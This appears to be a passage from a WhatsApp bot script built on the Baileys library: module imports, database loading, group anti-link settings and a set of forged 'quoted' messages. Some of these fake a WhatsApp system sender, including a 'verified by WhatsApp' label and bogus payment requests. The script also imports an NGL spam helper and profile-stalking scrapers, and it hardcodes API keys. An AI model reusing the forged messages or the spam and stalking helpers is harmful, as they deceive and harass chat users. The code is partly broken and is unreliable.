//————————————————————————//

/*

Base XyrooRynzz
Powered By Alice Assistent
© XyrooRynzz 2022 - 2026

Source
WhatsApp : https://wa.me/6281543496975
Tele me : https://t.me/XyrooRynzz
instagram : https://instagram.com/biionlyyone
WhatsApp: https://whatsapp.com/channel/0029VaagYHwCnA82hDK7l31D

*/

//————————————————————————//
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Modulenya bang
process.on('uncaughtException', console.error)
require('./AliceSet')
require('./AliceLibray/AliceMenu')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageContent, makeWASocket, generateWAMessage, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, PHONENUMBER_MCC, generateWAMessageFromContent, proto, prepareWAMessageMedia  } =require("@whiskeysockets/baileys")
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
const os = require('os')
const fs = require('fs')
const ms = require("ms");
const dns = require('dns');
const path = require("path")
const util = require('util')
const jimp_1 = require('jimp')
const https = require('https')
const chalk = require('chalk')
const ds = require('d-scrape')
const axios = require('axios')
const mark = `0@s.whatsapp.net`
const msx = require('parse-ms')
const fg = require('api-dylux')
const fsx = require('fs-extra')
const crypto = require('crypto')
const fetch = require('node-fetch');
const cron = require('node-cron')
const gtts = require('node-gtts')
const yts = require ('yt-search');
const cheerio = require('cheerio');
const { v4: uuidv4 } = require('uuid')
const nou = require("node-os-utils")
const FormData = require('form-data')
const genshindb = require("genshin-db")
const ffmpeg = require('fluent-ffmpeg');
const didyoumean = require('didyoumean');
const ffmpegStatic = require('ffmpeg-static');
const speed = require('performance-now')
const JsConfuser = require('js-confuser');
const similarity = require('similarity');
const moment = require('moment-timezone')
const PhoneNum = require('awesome-phonenumber')
const { Primbon } = require('scrape-primbon')
const { createCanvas, loadImage } = require('canvas');
const { S_WHATSAPP_NET } = require('@whiskeysockets/baileys')
const { GoogleGenerativeAI } = require ("@google/generative-ai");
const { spawn: spawn, exec, execSync } = require('child_process')
const primbon = new Primbon()
const threshold = 0.72
const DB_FILE = "./AliceDatabase/database.json";
// mengambil semua database
global.db.data = JSON.parse(fs.readFileSync('./AliceDatabase/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

const apii = {
  xterm: {
    url: "https://aihub.xtermai.xyz",
    key: "alicemd-xyroorynzz"
  }
};
const ownerNumber = global.owner; // Tanpa @s.whatsapp.net
function saveDB(db) {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Fungsi Untuk Memanggil Code Yang Ada Di File js Terpisah
const { resize } = require('./AliceLibray/myfunction')
const { monospace, randomKarakter } = require('./AliceLibray/myfunc')
const { nglspam, Enc } = require('./AliceLibray/scrape')
const { uptotelegra } = require('./AliceLibray/upload')
const uploadImage = require('./AliceLibray/uploadImage')
const { capital, encryptCode } = require('./AliceLibray/functionn');
const { chatGpt } = require('./AliceLibray/screaper');
const { toRupiah } = require("./AliceLibray/func")
const { CatBox } = require('./AliceLibray/uploadcatbox')
const changelogs = global.db.data.changelog || []
const db_absen = JSON.parse(fs.readFileSync("./AliceSystem/AliceDatabase/Group/absen.json"));
const db_sider = JSON.parse(fs.readFileSync("./AliceSystem/AliceDatabase/Group/sider.json"));
const contacts = JSON.parse(fs.readFileSync("./AliceDatabase/contacts.json"));
const user_ban = JSON.parse(fs.readFileSync('./AliceDatabase/banned.json'))
let _cmd = JSON.parse(fs.readFileSync('./AliceDatabase/command.json'));
const afk = require('./AliceSystem/AliceDatabase/Afk/afk')
let _afk = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Afk/afk.json'))
let mute = JSON.parse(fs.readFileSync('./AliceDatabase/mute.json'));
const timestampp = speed();
const latensi = speed() - timestampp
let reminders = {};
const { smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, reSize, randomNumber } = require('./AliceLibray/myfunction')
const { savefromV2, ChatGpt, searchfilm, tafsir, instagram4, capcutdl, instagram2, instagram3, cekkuota, tele, ytPlayMp4, ytPlayMp3, textpro, kodepos, listsurah, ephoto, emoji} = require('./AliceLibray/scraper')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./AliceSystem/AliceDatabase/Group/list')
let db_respon_list = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Group/list-message.json'))
const { 
	addFilter, 
	addSpam, 
	isFiltered, 
	isSpam, 
	ResetSpam 
} = require('./AliceLibray/antispam');
const TypeMess = getContentType(m?.message);
let reactions = TypeMess == "reactionMessage" ? m?.message[TypeMess]?.text : false;
// End
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Scraper
const animexin = require('./AliceSystem/AliceScraper/animexin');
const convertToMorse = require('./AliceSystem/AliceScraper/Morse.js')
const PlayStore = require('./AliceSystem/AliceScraper/playstore.js')
const WikiMedia = require('./AliceSystem/AliceScraper/wikimedia.js')
const FFW = require('./AliceSystem/AliceScraper/FFW.js')
const Python = require('./AliceSystem/AliceScraper/Python.js')
const Html = require('./AliceSystem/AliceScraper/Html.js')
const BookSearch = require('./AliceSystem/AliceScraper/caribuku.js')
const LirikLagu = require('./AliceSystem/AliceScraper/lirik.js')
const Eai = require('./AliceSystem/AliceScraper/eai.js')
const Yimg = require('./AliceSystem/AliceScraper/yahooimg.js')
const txt2 = require('./AliceSystem/AliceScraper/txt-to-image.js')
const JavaScript = require('./AliceSystem/AliceScraper/Javascript.js')
const { shortCloudku } = require('./AliceSystem/AliceScraper/shortCloudku');
const { ringtone } = require("./AliceSystem/AliceScraper/ringtone.js");
const { Felo } = require('./AliceSystem/AliceScraper/Felo.js');
const { Capcut } = require('./AliceSystem/AliceScraper/capcut')
const { pxpic } = require('./AliceSystem/AliceScraper/pxpic.js')
const { PinDL } = require('./AliceSystem/AliceScraper/pindl.js')
const { fdown } = require('./AliceSystem/AliceScraper/facebook.js')
const { wattpad } = require("./AliceSystem/AliceScraper/wattpad.js")
const { SaveTube } = require('./AliceSystem/AliceScraper/SaveTube.js')
const { komikindo } = require("./AliceSystem/AliceScraper/komikindo.js")
const { muslimai } = require('./AliceSystem/AliceScraper/MuslimAI.js')
const { Telesticker } = require('./AliceSystem/AliceScraper/scrape-telesticker')
const { tiktok2, tiktoks } = require('./AliceSystem/AliceScraper/Tiktok.js')
const { xnxxDownloader, xnxxSearch } = require('./AliceSystem/AliceScraper/xnxx')
const { Ytdl, yt_search, ddownr } = require('./AliceSystem/AliceScraper/ytdl')
const { createQRIS, checkStatus } = require('./AliceSystem/AliceScraper/qris')
const { upScale, remini, Pxpic } = require('./AliceSystem/AliceScraper/enhance')
const { npmStalk, chstalk } = require('./AliceSystem/AliceScraper/stalker')
const { instagramStalker } = require('./AliceSystem/AliceScraper/igstalk.js');
const { instaStalk, telegramStalk } = require('./AliceSystem/AliceScraper/stalker.js');
const { generateAttp, generateTtp, generateAttp_v2, generateTtp_v2, generateAttp_v3, generateTtp_v3,  generateAttp_v4, generateTtp_v4, generateTtp_v5 } = require("./AliceSystem/AliceScraper/generate-attp");
// End
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
const {
    igdl: igdl,
    youtube: youtube,
    ttdl: ttdl
} = require("btch-downloader");
const {
  createQR,
  cekStatus,
  cancelTrx,
  cekPay,
  callBack,
} = require("./AliceLibray/paydisini");
const {
addPremiumUser,
getPremiumExpired,
getPremiumPosition,
expiredCheck,
checkPremiumUser,
getAllPremiumUser,
} = require('./AliceLibray/premiun')
const {
  CNNNews,
  CNBCNews,
  DetikNews,
  KontanNews,
  iNews,
  Quotes,
  Couples,
  Darkjokes,
  DailyNews
} = require("dhn-api")
const {
  uploadFileToApi: uploadFileToApi,
  WidipeCdn: WidipeCdn,
  ShannzCdn: ShannzCdn,
  YudzCdn: YudzCdn
} = require('./AliceLibray/UploaderCdn.js')
const sendReaction = async reactionContent => {
  Alice.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};


const api = {
  xterm: {
    url: "https://aihub.xtermai.xyz",
    key: "AIzaeAWCPw44TGUASdDR"
  }
}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
module.exports = Alice = async (Alice, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreply.selectedRowId : (m.mtype == 'templateButtonreplyMessage') ? m.message.templateButtonreplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonreplyMessage') ? m.msg.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

const pushname = m.pushName || "No Name"
    
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// read database chats
const cekpesan = true;
    
    if (cekpesan) {
      const chatId = m.key.remoteJid;
      const senderId = m.key.participant || m.key.remoteJid;
      if (!global.db.data.chats[chatId]) {
        global.db.data.chats[chatId] = {};
      }
      if (!global.db.data.chats[chatId].totalChat) {
        global.db.data.chats[chatId].totalChat = {};
       } 
      global.db.data.chats[chatId].totalChat[senderId] = (global.db.data.chats[chatId].totalChat[senderId] || 0) + 1;
      saveDB(global.db.data);
      const msgContent = m.message.conversation || m.message.extendedTextMessage && m.message.extendedTextMessage.text || "";
    }
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTILINK Group
const ntilinkgc = JSON.parse(fs.readFileSync("./AliceSystem/AliceDatabase/Antilink/antilinkgc.json"))
let ntvirtex = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antivirus.json'))
let nttoxic = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antitoxic.json'))
let ntasing = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antiasing.json'))
let ntwame = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antiwame.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkytvideo.json'))
let ntilinktele =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktelegram.json'))
let ntilinkdewasa =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkbokep.json'))
let ntilinkterabox =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkterabox.json'))
let ntilinkmediafire =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkmediafire.json'))
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Anti In Group
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
const AntiLink = m.isGroup ? ntilinkgc.includes(m.chat) : false 
const AntiVirtex = m.isGroup ? ntvirtex.includes(m.chat) : false
const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(m.chat) : false
const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(m.chat) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(m.chat) : false
const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(m.chat) : false
const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(m.chat) : false
const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(m.chat) : false
const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(m.chat) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(m.chat) : false
const AntiWame = m.isGroup ? ntwame.includes(m.chat) : false
const AntiToxic = m.isGroup ? nttoxic.includes(m.chat) : false
const AntiAsing = m.isGroup ? ntasing.includes(m.chat) : false
const AntiDewasa = m.isGroup ? ntilinkdewasa.includes(m.chat) : false
const AntiTerabox = m.isGroup ? ntilinkterabox.includes(m.chat) : false
const AntiMediafire = m.isGroup ? ntilinkmediafire.includes(m.chat) : false
const AntiTele = m.isGroup ? ntilinktele.includes(m.chat) : false
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// SET OWNER,PREM,DLL DISINI!!!
//————————————————————————//
const senderr = m.key.fromMe
? Alice.user.id.split(":")[0] || Alice.user.id
: m.key.participant || m.key.remoteJid;
const senderNumber = senderr.split('@')[0];
const botNumber = Alice.user.id
if (m.key.fromMe || m.sender === botNumber) return
const owner = JSON.parse(fs.readFileSync('./AliceDatabase/owner.json')) //Owner
const premium = JSON.parse(fs.readFileSync('./AliceDatabase/premium.json')) //Prem
const args = body.trim().split(/ +/).slice(1)
const isOwner = [botNumber, ...owner, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) //Set text owner
//————————————————————————//
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// SET PREFIX BISA DI ATUR DISINI JUGA
//————————————————————————//
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
		if (Object.keys(db.data.settings).includes(botNumber) && Object.keys(db.data.settings[botNumber]).includes("setPrefix") && db.data.settings[botNumber].setPrefix == "one") {
			var thePrefix = "𝐌𝐔𝐋𝐓𝐈"
			var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
			var isCmd = body.startsWith(prefix)
			var command = isCmd ? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : ""
		} else if (Object.keys(db.data.settings).includes(botNumber) && Object.keys(db.data.settings[botNumber]).includes("setPrefix") && db.data.settings[botNumber].setPrefix == "no") {
			var thePrefix = "𝐍𝐎"
			var prefix = ""
			var isCmd = body.startsWith(prefix)
			var command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
		} else if (Object.keys(db.data.settings).includes(botNumber) && Object.keys(db.data.settings[botNumber]).includes("setPrefix") && db.data.settings[botNumber].setPrefix == "all") {
			var thePrefix = "𝐀𝐋𝐋"
			var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
			var isCmd = body.startsWith(prefix)
			var command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
		} else {
			var thePrefix = "𝐌𝐔𝐋𝐓𝐈"
			var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
			var isCmd = body.startsWith(prefix)
			var command = isCmd ? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : ""
		}
//————————————————————————//
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
const text = q = args.join(" ")
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByreply = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const isImage = /image/.test(mime);
const isVideo = /video/.test(mime);
const isSticker = /sticker/.test(mime);
const isAudio = /audio/.test(mime);
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await Alice.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isMute= mute.includes(m.chat) ? true : false
const isAfkOn = afk.checkAfkUser(m.sender, _afk)
const isXMEDIA = m.mtype
const isBot = botNumber.includes(senderNumber)
const isPrivate = !m.key.remoteJid.includes('@g.us');
const qmsg = (quoted.msg || quoted)
const more = String.fromCharCode(8206)
const isPc = from.endsWith('@s.whatsapp.net')
const isBan = user_ban.includes(m.sender)
const readmore = more.repeat(4001)
const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])] 
const isPrem = isOwner || isOwner || checkPremiumUser(m.sender, premium);
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"

const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  

if(time2 < "00:00:00"){
var stime = Styles(`Selamat Tengah Malam 👋🏻`)
 }
 if(time2 < "19:00:00"){
var stime = Styles(`Selamat Malam 👋🏻`)
 }
 if(time2 < "16:00:00"){
var stime = Styles(`Selamat Sore 👋🏻`)
 }
 if(time2 < "11:00:00"){
var stime = Styles(`Selamat Siang 👋🏻`)
 }
 if(time2 < "06:00:00"){
var stime = Styles(`Selamat Pagi 👋🏻`)
 }
 
const timee = moment().tz('Asia/Jakarta').format("HH:mm:ss");
const timestamp = moment().tz("Asia/Jakarta").valueOf();
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal2 = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')	
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
const XyrooRynzz = prefix+command
const Xyroo = prefix
const Rynzz = command
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Warn
const warnPath = path.join(__dirname, 'AliceDatabase', 'warn.json');
if (!fs.existsSync(warnPath)) fs.writeFileSync(warnPath, JSON.stringify({}));

const warnData = JSON.parse(fs.readFileSync(warnPath, 'utf-8'));

function saveWarnData() {
  fs.writeFileSync(warnPath, JSON.stringify(warnData, null, 2));
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// RPG
// Pastikan folder RPG tersedia
if (!fs.existsSync('./AliceSystem')) fs.mkdirSync('./AliceSystem')
if (!fs.existsSync('./AliceSystem/AliceDatabase')) fs.mkdirSync('./AliceSystem/AliceDatabase')
if (!fs.existsSync('./AliceSystem/AliceDatabase/Rpg')) fs.mkdirSync('./AliceSystem/AliceDatabase/Rpg')

// Path file RPG
const rpgFile = './AliceSystem/AliceDatabase/Rpg/rpg.json'

// Load database
let rpgDb = {}
if (fs.existsSync(rpgFile)) {
  rpgDb = JSON.parse(fs.readFileSync(rpgFile))
} else {
  fs.writeFileSync(rpgFile, JSON.stringify(rpgDb, null, 2))
}

// Fungsi menyimpan database
function saveRpg() {
  fs.writeFileSync(rpgFile, JSON.stringify(rpgDb, null, 2))
}

// Fungsi inisialisasi user
function initRpgUser(id, name = 'Petualang') {
  if (!rpgDb[id]) {
    rpgDb[id] = {
      name,
      coin: 100,
      exp: 0,
      level: 1,
      inv: [],
      weapon: '',
      armor: '',
      bank: 0,
      dailyCooldown: 0,
      workCooldown: 0,
      huntCooldown: 0,
      quest: { dailyDone: false }
    }
    saveRpg()
  }
}

// Format waktu
function msToTime(ms) {
  let m = Math.floor(ms / 60000)
  let s = Math.floor((ms % 60000) / 1000)
  return `${m}m ${s}s`
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Get Scraper
const Xscraper = `AliceSystem/AliceScraper/${text}.js`
const listScraper = fs.readdirSync('./AliceSystem/AliceScraper').map((v, index) => `> ${index + 1}. ${v}`).join('\n')
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Fake Quoted
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Getpp user
const cap = 'Alice'
try {
pplu = await Alice.profilePictureUrl(anu.id, 'image')
} catch {
pplu = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

const x = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                "contactMessage": {
                    'displayName': `$${ownername}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN: ${botname} v3.0\nitem1.TEL;waid=${m.sender.split("@")[0]}:+${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': pplu,
                    thumbnail: pplu,
                    sendEphemeral: true
                }   
            }
        }
        
// Fake Quoted   
const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${packname} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${ownername}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const XR = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: `628555`, participant: '0@s.whatsapp.net' }, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: `XR - XyrooRynzz 2025` } }, expiryTimestamp: 222222222, amount: { value: 91929291929, offset: 1000, currencyCode: "INR" }}}}

const xy = {
    key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
    },
    message: {
        orderMessage: {
            itemCount: 99999,
            status: 200,
            thumbnailUrl: thumbnailReply,
            surface: 200,
            message: `${packname}`,
            orderTitle: '@ciro',
            sellerJid: '0@s.whatsapp.net'
        }
    },
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true
    },
    sendEphemeral: true
};

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${ownername}`,jpegThumbnail: ""}}}

    const p ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 9999,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}

		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=6281328139682:6281328139682\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}

    const al = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": '${ownername}',"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./AliceMedia/image/Alice.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}	

	const ftroli = { key:{ remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message:{ newsletterAdminInviteMessage: { newsletterJid: 'nd@newsletter', newsletterName: 'Information', caption: `© ${ownername} | 2025`, inviteExpiration: 0}}}	

const xyyy = {
key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `${ownername}`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "IDR", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: `${botname}`}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "INR"}}}}

const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `_${botname} Terverifikasi Oleh WhatsApp_`,thumbnailUrl: thumb}}}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Didyoumean
// Ambil semua command yang punya case secara otomatis
const fileIsi = fs.readFileSync(__filename, 'utf-8')
const allCaseCommands = [...fileIsi.matchAll(/case\s+['"`](.*?)['"`]:/g)].map(x => x[1])
// End
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// reply Footer
const nwreply = (anu) => {
const {message, key} = generateWAMessageFromContent(m.chat, {
  interactiveMessage: {
    body: {text: anu},
    footer: {text: `${packname}`},
    nativeFlowMessage: {
      buttons: [{text: "2025"}
           ],
    }
  },
}, {quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `${XyrooRynzz}`}}})
 Alice.relayMessage(m.chat, {viewOnceMessage:{message}}, {messageId:key.id})
}

async function alicereply(teks) {
      const nedd = {      
        contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: botname,
